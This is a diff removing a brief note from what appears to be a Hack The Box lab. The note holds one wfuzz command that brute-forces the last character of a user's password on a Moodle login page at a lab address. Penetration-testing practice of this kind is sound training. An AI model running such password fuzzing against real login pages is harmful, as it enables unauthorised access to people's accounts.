@@ -1,5 +1,0 @@
-
-
-Fuzz post data:
-wfuzz -u http://10.10.10.153/moodle/login/index.php -w /home/htb-woodenshoe/htb/wordlist/SecLists/Fuzzing/special-chars.txt -d 'anchor=&username=Giovanni&password=Th4C00lTheachaFUZZ'
-
